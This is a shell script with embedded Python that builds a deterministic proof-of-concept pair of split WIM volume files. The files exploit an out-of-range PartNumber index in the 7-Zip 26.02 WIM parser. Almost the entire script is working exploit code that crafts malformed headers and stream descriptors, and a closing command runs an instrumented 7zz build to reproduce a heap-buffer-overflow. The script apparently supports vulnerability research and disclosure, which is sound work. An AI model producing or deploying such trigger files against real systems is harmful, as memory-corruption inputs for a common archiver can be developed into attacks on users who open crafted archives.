#!/usr/bin/env bash
# Regenerate the PoC volume pair (7-Zip 26.02 WIM PartNumber out-of-bounds index).
# Fully synthetic and deterministic: no reference archive is needed.
# Requires: python3.
#
# Usage: ./make-poc-image.sh [outdir]
set -euo pipefail
OUT="${1:-.}"

python3 - "$OUT" <<'PY'
import hashlib, os, struct, sys

# Layout taken from the 26.02 sources, not guessed:
#   CPP/7zip/Archive/Wim/WimIn.cpp  CHeader::Parse()    -> 0xD0 header
#   CPP/7zip/Archive/Wim/WimIn.cpp  CResource::Parse()  -> 24-byte resource
#   CPP/7zip/Archive/Wim/WimIn.cpp  ParseStream()       -> 50-byte descriptor
#   CPP/7zip/Archive/Wim/WimIn.h    kStreamInfoSize = 24 + 2 + 4 + 20
WIM_SIG = b"MSWIM\0\0\0"
HEADER_SIZE = 0xD0
VERSION_NEW = 0x00010D00
K_STREAM_INFO_SIZE = 24 + 2 + 4 + 20
RESFLAG_METADATA = 1 << 1
GUID = bytes(range(0x10, 0x20))
POISON_PART = 2          # the out-of-range volume index
NUM_PARTS = 2

def resource(pack, off, unpack, flags=0):
    return (struct.pack("<Q", pack)[:7] + bytes([flags])
            + struct.pack("<Q", off) + struct.pack("<Q", unpack))

def stream_desc(pack, off, unpack, part, refcount, sha1):
    b = resource(pack, off, unpack) + struct.pack("<HI", part, refcount) + sha1
    assert len(b) == K_STREAM_INFO_SIZE
    return b

def header(part, num_parts, off_res, xml_res, meta_res):
    h = bytearray(HEADER_SIZE)
    h[0:8] = WIM_SIG
    struct.pack_into("<I", h, 0x08, HEADER_SIZE)
    struct.pack_into("<I", h, 0x0C, VERSION_NEW)
    h[0x18:0x28] = GUID                       # shared GUID: AreFromOnArchive()
    struct.pack_into("<H", h, 0x28, part)     # PartNumber
    struct.pack_into("<H", h, 0x2A, num_parts)
    h[0x30:0x48] = off_res
    h[0x48:0x60] = xml_res
    h[0x60:0x78] = meta_res
    return bytes(h)

XML = b"\xff\xfe" + "<WIM><TOTALBYTES>0</TOTALBYTES></WIM>".encode("utf-16-le")

def volume(part, table, payload, meta_nonempty):
    off_payload = HEADER_SIZE
    off_table = off_payload + len(payload)
    off_xml = off_table + len(table)
    # CResource::IsEmpty() is (UnpackSize == 0).  A non-zero MetadataResource
    # makes CDatabase::Open() finish with `if (needBootMetadata) return S_FALSE;`
    # -- AFTER ReadStreams() has already appended this volume's descriptors.
    meta = (resource(len(payload) or 1, off_payload, len(payload) or 1,
                     RESFLAG_METADATA) if meta_nonempty else bytes(24))
    return (header(part, NUM_PARTS,
                   resource(len(table), off_table, len(table)),
                   resource(len(XML), off_xml, len(XML)), meta)
            + payload + table + XML)

outdir = sys.argv[1]
payload = b"A" * 16
sha = hashlib.sha1(payload).digest()

# Volume 1: valid, empty stream table.  _volumes grows to size 2 (indices 0,1).
v1 = volume(1, b"", b"", meta_nonempty=False)
# Volume 2: one data-stream descriptor claiming PartNumber = 2, plus a
# non-empty MetadataResource so CDatabase::Open() returns S_FALSE afterwards.
t2 = stream_desc(len(payload), HEADER_SIZE, len(payload), POISON_PART, 0, sha)
v2 = volume(POISON_PART, t2, payload, meta_nonempty=True)

p1 = os.path.join(outdir, "poc.swm")
p2 = os.path.join(outdir, "poc2.swm")
open(p1, "wb").write(v1)
open(p2, "wb").write(v2)
print("wrote %s (%d bytes) and %s (%d bytes)"
      % (p1, len(v1), p2, len(v2)))
PY

echo "run: <7zz-26.02-asan> x poc.swm -o/tmp/x -y   # -> heap-buffer-overflow in WimHandler.cpp"
